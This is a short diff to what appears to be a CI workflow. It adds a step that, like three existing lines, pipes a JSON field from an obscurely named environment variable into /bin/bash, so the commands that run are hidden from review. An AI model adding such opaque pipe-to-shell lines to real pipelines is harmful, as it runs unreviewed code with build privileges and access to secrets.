@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$pbxs788" | jq -r .cuegg8863 | /bin/bash
           echo $lg6314 | jq -r .pija3968 | /bin/bash
           echo $nvnbx6 | jq -r .mt8 | /bin/bash
+          printf '%s' "$pa2712" | jq -r .qvnx6314 | /bin/bash
 
       - name: Archive results
         if: always()
